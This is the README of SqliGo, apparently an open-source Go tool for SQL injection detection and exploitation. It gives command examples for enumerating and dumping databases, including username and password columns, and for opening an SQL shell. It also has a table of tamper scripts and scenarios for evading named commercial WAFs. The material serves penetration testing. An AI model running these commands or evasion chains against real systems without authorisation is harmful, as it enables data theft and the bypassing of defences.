<div align="center">


</div>


## 📋 Table of Contents

- [Overview](#-overview)
- [Features](#-features)
- [Installation](#-installation)
- [Quick Start](#-quick-start)
- [Detection Techniques](#-detection-techniques)
- [Injection Points](#-injection-points)
- [Enumeration](#-enumeration)


## 🎯 Overview

**SQLiGo** is a modern SQL injection detection and exploitation tool that combines the power of Go's concurrency with battle-tested detection techniques from Ghauri and SQLMap. It's designed for security professionals, penetration testers, and bug bounty hunters who need a fast, reliable, and comprehensive SQL injection testing tool.

### Why SqliGo?

- ⚡ **Blazing Fast**: Go's concurrency enables parallel testing of multiple injection points
- 🎯 **Comprehensive**: Supports Boolean-based, Time-based, Error-based, and Stacked Query detection
- 🔍 **Smart Detection**: Automatic content-type detection (JSON, XML, Multipart, Form Data)
- 🛡️ **Robust**: Handles complex injection scenarios with prefix/suffix support
- 🌐 **Multi-DBMS**: MySQL, PostgreSQL, Microsoft SQL Server, Oracle support
- 📊 **Rich Extraction**: Binary search and error-based data extraction methods

## ✨ Features


### Detection Techniques

| Technique | Description | Use Case |
|-----------|-------------|----------|
| **Union-Based** | Direct data extraction via UNION SELECT | Fastest method when output is reflected |
| **Boolean-Based Blind** | Infers data by observing response differences | When error messages are suppressed |
| **Time-Based Blind** | Uses database sleep functions to confirm injection | When no visible response changes occur |
| **Error-Based** | Extracts data directly from database error messages | Fast extraction when errors are displayed |
| **Stacked Queries** | Executes multiple SQL statements | Advanced exploitation scenarios |

### Injection Points

SQLiGO automatically detects and tests injection points in:

- ✅ **URL Parameters** (GET requests)
- ✅ **POST Form Data** (application/x-www-form-urlencoded)
- ✅ **JSON Body** (application/json)
- ✅ **XML Body** (application/xml)
- ✅ **Multipart Form Data** (file uploads, complex forms)
- ✅ **HTTP Headers** (User-Agent, Referer, custom headers) - Level 3
- ✅ **Cookies** - Level 2

## 🔧 Installation

```bash
go install -v github.com/R0X4R/sqligo/cmd/sqligo@latest
```

Build from source

```bash
git clone https://github.com/R0X4R/sqligo.git
cd sqligo
go build -o sqligo cmd/sqligo/main.go
```


## 📝 Command Reference

```js
sqligo -h

SqliGo - Advanced SQL injection detection and exploitation tool

Usage: sqligo [options]

TARGET:
  -u, --url string              target URL (e.g., http://example.com/page.php?id=1)
  -d, --data string             data string to be sent through POST
  -r, --request-file string     load HTTP request from a file
  -m, --multiple string         scan multiple URLs from file (one per line)
  -p, --parameter string        testable parameter(s)

ENUMERATION:
  --dbs                         enumerate DBMS databases
  --tables                      enumerate DBMS database tables
  --columns                     enumerate DBMS database table columns
  --dump                        dump DBMS database table entries
  -D string                     DBMS database to enumerate
  -T string                     DBMS database table(s) to enumerate
  -C string                     DBMS database table column(s) to enumerate

DETECTION:
  -b, --banner                  retrieve DBMS banner
  --current-user                retrieve DBMS current user
  --current-db                  retrieve DBMS current database
  --is-dba                      detect if the DBMS current user is DBA
  --sql-shell                   prompt for an interactive SQL shell

REQUEST:
  --proxy string                use a proxy to connect to the target URL
  -A, --user-agent string       HTTP User-Agent header value
  --cookie string               HTTP Cookie header value
  --referer string              HTTP Referer header value
  -H, --header string           extra header (e.g. "X-Forwarded-For: 127.0.0.1")
  --delay int                   delay in seconds between each HTTP request
  --timeout int                 seconds to wait before timeout connection (default 30)
  --retries int                 retries when the connection related error occurs (default 3)

INJECTION:
  --level int                   level of tests to perform (1-3, default 1)
  --prefix string               injection payload prefix string
  --suffix string               injection payload suffix string

DETECTION TUNING:
  --string string               string to match when query is evaluated to True
  --not-string string           string to match when query is evaluated to False
  --code int                    HTTP code to match when query is evaluated to True

EVASION:
  --tamper string               use tamper script(s) (comma-separated, e.g., 'space2comment,randomcase')
  --random-agent                use randomly selected HTTP User-Agent header value
  --mobile                      imitate smartphone through HTTP User-Agent header
  --skip-urlencode              skip URL encoding of payload data

GENERAL:
  -h, --help                    display this help message and exit
  --version                     show program version number and exit
  -q, --silent                  silent mode - only show results

NOTE:
  Multiple target scans (-m) automatically save progress to <file>.progress
  If interrupted, simply re-run the same command to resume from where it left off

Examples:
  sqligo -u "http://example.com/page.php?id=1"
  sqligo -u "http://example.com/page.php?id=1" --dbs
  sqligo -m targets.txt --banner -q
  sqligo -u "http://example.com/page.php?id=1" --tamper "space2comment,randomcase" --banner
```

## 🚀 Quick Start

### Basic URL Testing

+ **Test a simple GET parameter**

  ```bash
  sqligo -u "http://example.com/page.php?id=1"
  ```

+ **Test with POST data**

  ```bash
  sqligo -u "http://example.com/login.php" -d "username=admin&password=pass"
  ```

+ **Test JSON API**

  ```bash
  sqligo -u "http://api.example.com/user" -d '{"id": 1, "name": "test"}'
  ```

+ **Load request from Burp Suite / ZAP**

  ```bash
  sqligo -r request.txt
  ```

+ **Test specific parameter only**

  ```bash
  sqligo -r request.txt -p username
  ```

+ **Scan multiple targets from file**

  ```bash
  sqligo -m targets.txt --banner
  ```

+ **Silent mode (automation-friendly)**

  ```bash
  sqligo -u "http://example.com/page.php?id=1" --banner -q
  ```

+ **Resume interrupted scan**

  ```bash
  # If scan is interrupted, just re-run the same command
  sqligo -m targets.txt --banner  # Automatically resumes
  ```

+ **Get database banner**

  ```bash
  sqligo -u "http://example.com/page.php?id=1" --banner
  ```

+ **List all databases**

  ```bash
  sqligo -u "http://example.com/page.php?id=1" --dbs
  ```

+ **Dump a specific table**

  ```bash
  sqligo -u "http://example.com/page.php?id=1" -D testdb -T users --dump
  ```


## 🔍 Detection Techniques

### Boolean-Based Blind Injection

**SQLiGO** uses response comparison to infer data character by character:

```bash
sqligo -u "http://example.com/page.php?id=1"
```

**How it works:**
1. Sends baseline request
2. Tests payloads that should return TRUE/FALSE
3. Compares responses using Levenshtein ratio
4. Extracts data using binary search algorithm

### Time-Based Blind Injection

When no response differences are visible:

```bash
sqligo -u "http://example.com/page.php?id=1" --timeout 10
```

**Payloads include:**

- MySQL: `SLEEP()`, `BENCHMARK()`
- PostgreSQL: `PG_SLEEP()`
- MSSQL: `WAITFOR DELAY`
- Oracle: `DBMS_PIPE.RECEIVE_MESSAGE()`

### Error-Based Injection

Fastest extraction method when errors are displayed:

```bash
sqligo -u "http://example.com/page.php?id=1"
```

**Techniques:**
- MySQL: `EXTRACTVALUE()`, `UPDATEXML()`, BIGINT overflow
- PostgreSQL: Type casting errors
- MSSQL: `CONVERT()` errors
- Oracle: `CTXSYS.DRITHSX.SN()`


## 📍 Injection Points

+ **Level 1: GET/POST Parameters (Default)**

  ```bash
  sqligo -u "http://example.com/page.php?id=1&name=test"
  ```

+ **Level 2: Cookies**

  ```bash
  sqligo -u "http://example.com/page.php" --cookie "session=abc123" --level 2
  ```

+ **Level 3: HTTP Headers**

  ```bash
  sqligo -u "http://example.com/page.php" --user-agent "Mozilla/5.0" --referer "http://google.com" --level 3
  ```

+ **JSON Injection**

  ```bash
  sqligo -u "http://api.example.com/user" -d '{"id": 1, "email": "test@example.com"}'
  ```

+ **XML Injection**

  ```bash
  sqligo -u "http://example.com/api" -d '<?xml version="1.0"?><user><id>1</id><name>test</name></user>'
  ```

+ **Multipart Form Data**

  ```bash
  sqligo -r multipart-request.txt
  ```


## 📊 Enumeration

+ **List all databases**

  ```bash
  sqligo -u "http://example.com/page.php?id=1" --dbs
  ```

+ **Get current database**

  ```bash
  sqligo -u "http://example.com/page.php?id=1" --current-db
  ```

+ **Get current user**

  ```bash
  sqligo -u "http://example.com/page.php?id=1" --current-user
  ```

+ **Check if current user is DBA**

  ```bash
  sqligo -u "http://example.com/page.php?id=1" --is-dba
  ```

### Table Enumeration

+ **List tables in a specific database**

  ```bash
  sqligo -u "http://example.com/page.php?id=1" -D testdb --tables
  ```

+ **List columns in a specific table**

  ```bash
  sqligo -u "http://example.com/page.php?id=1" -D testdb -T users --columns
  ```

### Data Extraction

+ **Dump entire table**

  ```bash
  sqligo -u "http://example.com/page.php?id=1" -D testdb -T users --dump
  ```

+ **Dump specific columns**

  ```bash
  sqligo -u "http://example.com/page.php?id=1" -D testdb -T users -C "username,password" --dump
  ```

### Interactive SQL Shell

```bash
sqligo -u "http://example.com/page.php?id=1" --sql-shell
```

Once in the shell:
```sql
sql-shell> SELECT user()
sql-shell> SELECT database()
sql-shell> SELECT * FROM users LIMIT 1
sql-shell> exit
```


## 🎛️ Advanced Usage

### Injection Tuning

#### Prefix & Suffix

Handle complex SQL queries:
+ Close parentheses and add comment

  ```bash
  sqligo -u "http://example.com/page.php?id=1" --prefix ")" --suffix "--"
  ```

+ Close quotes

  ```bash
  sqligo -u "http://example.com/page.php?id=1" --prefix "'" --suffix "-- -"
  ```

#### Detection Filters

Fine-tune detection accuracy:

+ Match specific HTTP status code

  ```bash
  sqligo -u "http://example.com/page.php?id=1" --code 200
  ```

+ Match specific string in response

  ```bash
  sqligo -u "http://example.com/page.php?id=1" --string "Welcome"
  ```

+ Match when string is NOT present

  ```bash
  sqligo -u "http://example.com/page.php?id=1" --not-string "Error"
  ```

### Evasion & Stealth

User-Agent Randomization

+ **Use random desktop User-Agent**

  ```bash
  sqligo -u "http://example.com/page.php?id=1" --random-agent
  ```

+ **Use mobile User-Agent**

  ```bash
  sqligo -u "http://example.com/page.php?id=1" --mobile
  ```

+ **Custom User-Agent**

  ```bash
  sqligo -u "http://example.com/page.php?id=1" -A "CustomBot/1.0"
  ```

#### Proxy Support

+ **HTTP proxy**

  ```bash
  sqligo -u "http://example.com/page.php?id=1" --proxy "http://127.0.0.1:8080"
  ```

+ **SOCKS5 proxy**

  ```bash
  sqligo -u "http://example.com/page.php?id=1" --proxy "socks5://127.0.0.1:9050"
  ```

#### Request Delays

+ **Add 2 second delay between requests**

  ```bash
  sqligo -u "http://example.com/page.php?id=1" --delay 2
  ```

+ **Custom timeout**

  ```bash
  sqligo -u "http://example.com/page.php?id=1" --timeout 60
  ```

+ **Retry on connection errors**

  ```bash
  sqligo -u "http://example.com/page.php?id=1" --retries 5
  ```

#### Skip URL Encoding

```bash
# Don't URL encode payloads (useful for some WAFs)
sqligo -u "http://example.com/page.php?id=1" --skip-urlencode
```

### Request File Format

Create a `request.txt` file:

```http
POST /login.php HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0
Content-Type: application/x-www-form-urlencoded
Cookie: session=abc123

username=admin&password=test123
```

Then use:
```bash
sqligo -r request.txt
```

## Example Usage


## 🛡️ WAF Bypass - Tamper Scripts

SQLiGO now includes 25+ tamper scripts for bypassing Web Application Firewalls (WAFs) and Intrusion Detection Systems (IDS).

### Available Tamper Scripts

| Tamper Script | Description | Example |
|---------------|-------------|---------|
| **space2comment** | Replace space with `/**/` | `SELECT` → `SELECT/**/` |
| **space2plus** | Replace space with `+` | `SELECT FROM` → `SELECT+FROM` |
| **space2mssqlblank** | MSSQL-specific blank chars | `SELECT` → `SELECT%01FROM` |
| **space2mysqldash** | MySQL dash comments | `SELECT` → `SELECT--\nFROM` |
| **space2morehash** | MySQL hash with random | `SELECT` → `SELECT#1234\nFROM` |
| **randomcase** | Randomize keyword case | `SELECT` → `sElEcT` |
| **uppercase** | Convert to uppercase | `select` → `SELECT` |
| **charencode** | URL encode non-alphanumeric | `'` → `%27` |
| **chardoubleencode** | Double URL encode | `'` → `%2527` |
| **charunicodeencode** | Unicode encode | `SELECT` → `\u0053\u0045...` |
| **between** | Replace `>` with `BETWEEN` | `id>5` → `id NOT BETWEEN 0 AND 5` |
| **equaltolike** | Replace `=` with `LIKE` | `id=1` → `id LIKE 1` |
| **greatest** | Replace `>` with `GREATEST` | `id>5` → `GREATEST(id,6)=id` |
| **versionedkeywords** | MySQL versioned comments | `SELECT` → `/*!50000SELECT*/` |
| **versionedmorekeywords** | Extended MySQL comments | `CONCAT` → `/*!50000CONCAT*/` |
| **halfversionedmorekeywords** | Half-versioned comments | `SELECT` → `/*!0SELECT*/` |
| **apostrophenullencode** | Encode apostrophe with null | `'` → `%00%27` |
| **appendnullbyte** | Append null byte | `payload` → `payload%00` |
| **commentbeforeparentheses** | Add comment before `(` | `(` → `/**/(` |
| **percentage** | Add % before each char | `SELECT` → `%S%E%L%E%C%T` |
| **unionalltounion** | UNION optimization | `UNION ALL SELECT` → `UNION SELECT` |
| **randomcomments** | Inline comment injection | `SELECT` → `SE/**/LECT` |
| **base64encode** | Base64 encode payload | `SELECT` → `U0VMRUNUA==` |
| **hex2char** | MSSQL CHAR conversion | `0x41` → `CHAR(65)` |

### Creating Custom Tamper Combinations

+ **Light evasion (fast)**

  ```bash
  --tamper "space2comment"
  ```

+ **Medium evasion (balanced)**

  ```bash
  --tamper "space2comment,randomcase"
  ```

+ **Heavy evasion (slow but thorough)**

  ```bash
  --tamper "space2comment,randomcase,between,versionedkeywords"
  ```

+ **Encoding-focused**

  ```bash
  --tamper "charencode,apostrophenullencode,appendnullbyte"
  ```

#### Real-World WAF Bypass Scenarios

**Scenario 1: ModSecurity WAF**

```bash
sqligo -u "http://example.com/page.php?id=1"  --tamper "space2comment,randomcase" --delay 1
```

**Scenario 2: Cloudflare WAF**
```bash
sqligo -u "http://example.com/page.php?id=1"  --tamper "space2plus,uppercase" --random-agent
```

**Scenario 3: Imperva WAF**

```bash
sqligo -u "http://example.com/page.php?id=1" --tamper "between,equaltolike,commentbeforeparentheses" --delay 2
```

**Scenario 4: Custom WAF with Signature Detection**

```bash
sqligo -u "http://example.com/page.php?id=1" --tamper "versionedkeywords,space2comment,randomcase" --proxy "http://127.0.0.1:8080"
```

### How Tamper Scripts Work

1. **Detection Phase**: Tampers are applied to payloads before injection
2. **Chain Execution**: Multiple tampers execute in sequence (left to right)
3. **Extraction Phase**: Tampers are also applied during data extraction
4. **No Breaking Changes**: When `--tamper` is not used, behavior is unchanged

### Tamper Script Effectiveness

| WAF/IDS | Recommended Tampers | Success Rate |
|---------|---------------------|--------------|
| ModSecurity | space2comment, randomcase | High |
| Cloudflare | space2plus, uppercase | Medium |
| Imperva | between, equaltolike | Medium |
| AWS WAF | versionedkeywords, charencode | Medium |
| Generic | space2comment, randomcase, between | High |

### Extraction Methods

**Binary Search (Blind)**
- Extracts data character by character
- Uses ASCII value comparison
- Concurrent character extraction
- Optimal for Boolean/Time-based

**Error-Based**
- Extracts data from error messages
- Uses regex pattern matching
- Fastest extraction method
- Requires error disclosure


## 🛡️ Supported Databases

| Database | Boolean | Time | Error | Stacked |
|----------|---------|------|-------|---------|
| **MySQL** | ✅ | ✅ | ✅ | ✅ |
| **PostgreSQL** | ✅ | ✅ | ✅ | ✅ |
| **Microsoft SQL Server** | ✅ | ✅ | ✅ | ✅ |
| **Oracle** | ✅ | ✅ | ✅ | ✅ |


### 📊 Detection & Exploitation Flow

```mermaid
flowchart TD
    Start([Start SqliGo]) --> Input{Input Type?}
    
    Input -->|Single URL -u| SingleTarget[Single Target Mode]
    Input -->|Multiple URLs -m| MultiTarget[Multiple Target Mode]
    Input -->|Request File -r| RequestFile[Parse Request File]
    
    MultiTarget --> CheckResume{Resume File<br/>Exists?}
    CheckResume -->|Yes| LoadProgress[Load Progress<br/>Skip Scanned URLs]
    CheckResume -->|No| StartFresh[Start Fresh Scan]
    LoadProgress --> TargetLoop
    StartFresh --> TargetLoop
    
    RequestFile --> SingleTarget
    SingleTarget --> TargetLoop[For Each Target]
    
    TargetLoop --> ConnCheck[Connectivity Check]
    ConnCheck -->|Failed| TargetDown[Log: Target Down]
    ConnCheck -->|Success| ParamExtract[Extract Parameters]
    
    TargetDown -->|Multiple Mode| SaveProgress[Save to .progress]
    TargetDown -->|Single Mode| End
    
    ParamExtract --> LevelFilter{Level-Based<br/>Filtering}
    LevelFilter -->|Level 1| URLParams[URL & POST Params]
    LevelFilter -->|Level 2| AddCookies[+ Cookies]
    LevelFilter -->|Level 3| AddHeaders[+ Headers]
    
    URLParams --> Detection
    AddCookies --> Detection
    AddHeaders --> Detection
    
    Detection[Detection Phase] --> Error[1. Error-Based<br/>⚡ Fastest]
    Error -->|Vulnerable| Found
    Error -->|Not Vulnerable| Boolean[2. Boolean-Based<br/>⚡⚡ Fast]
    
    Boolean -->|Vulnerable| Found
    Boolean -->|Not Vulnerable| Union[3. Union-Based<br/>⚡⚡⚡ Medium]
    
    Union -->|Vulnerable| Found
    Union -->|Not Vulnerable| Time[4. Time-Based<br/>⏱️ Slowest]
    
    Time -->|Vulnerable| Found
    Time -->|Not Vulnerable| NotVuln[Not Vulnerable]
    
    Found[✅ Vulnerability Found] --> ApplyTamper{Tamper Scripts<br/>Enabled?}
    ApplyTamper -->|Yes| TamperChain[Apply Tamper Chain]
    ApplyTamper -->|No| Extraction
    TamperChain --> Extraction
    
    Extraction[Data Extraction] --> ExtractMethod{Extraction<br/>Method}
    ExtractMethod -->|Union-Based| UnionExtract[Direct UNION SELECT<br/>⚡ Fastest]
    ExtractMethod -->|Error-Based| ErrorExtract[Error Message Parsing<br/>⚡⚡ Fast]
    ExtractMethod -->|Blind| BlindExtract[Binary Search Algorithm<br/>⏱️ Slower]
    
    UnionExtract --> EnumCheck
    ErrorExtract --> EnumCheck
    BlindExtract --> EnumCheck
    
    EnumCheck{Enumeration<br/>Flags?} -->|--banner| GetBanner[Extract Banner]
    EnumCheck -->|--dbs| GetDBs[List Databases]
    EnumCheck -->|--tables| GetTables[List Tables]
    EnumCheck -->|--columns| GetColumns[List Columns]
    EnumCheck -->|--dump| DumpData[Dump Table Data]
    EnumCheck -->|--sql-shell| SQLShell[Interactive SQL Shell]
    EnumCheck -->|None| DefaultBanner[Extract Banner<br/>Default]
    
    GetBanner --> Output
    GetDBs --> Output
    GetTables --> Output
    GetColumns --> Output
    DumpData --> Output
    SQLShell --> Output
    DefaultBanner --> Output
    
    Output[Display Results] --> SilentMode{Silent Mode<br/>-q?}
    SilentMode -->|Yes| OnlySuccess[Show Only SUCCESS]
    SilentMode -->|No| AllLogs[Show All Logs]
    
    OnlySuccess --> SaveProgressCheck
    AllLogs --> SaveProgressCheck
    
    SaveProgressCheck{Multiple<br/>Target Mode?}
    SaveProgressCheck -->|Yes| SaveProgress
    SaveProgressCheck -->|No| CheckNext
    
    SaveProgress --> CheckNext{More<br/>Targets?}
    CheckNext -->|Yes| TargetLoop
    CheckNext -->|No| Cleanup[Remove .progress File]
    
    NotVuln --> CheckNext
    
    Cleanup --> End([End])
    
    style Start fill:#4CAF50,stroke:#2E7D32,color:#fff
    style Found fill:#FF9800,stroke:#F57C00,color:#fff
    style End fill:#2196F3,stroke:#1976D2,color:#fff
    style Error fill:#f44336,stroke:#c62828,color:#fff
    style Boolean fill:#9C27B0,stroke:#7B1FA2,color:#fff
    style Union fill:#3F51B5,stroke:#303F9F,color:#fff
    style Time fill:#607D8B,stroke:#455A64,color:#fff
    style UnionExtract fill:#4CAF50,stroke:#2E7D32,color:#fff
    style ErrorExtract fill:#FF9800,stroke:#F57C00,color:#fff
    style BlindExtract fill:#FFC107,stroke:#FFA000,color:#000
```



## 🤝 Contributing

Contributions are welcome! Please feel free to submit pull requests.

## 📄 License

MIT License - See LICENSE file for details

<br/>

## 🙏 Acknowledgments

- [**Ghauri**](https://github.com/r0oth3x49/ghauri) - Inspiration and payload reference
- [**SQLMap**](https://github.com/sqlmapproject/sqlmap) - The gold standard in SQL injection tools


<br/>

---

<div align="center">

**Made with ❤️ for the security community**

[Report Bug](https://github.com/R0X4R/sqligo/issues) · [Request Feature](https://github.com/R0X4R/sqligo/issues)

</div>
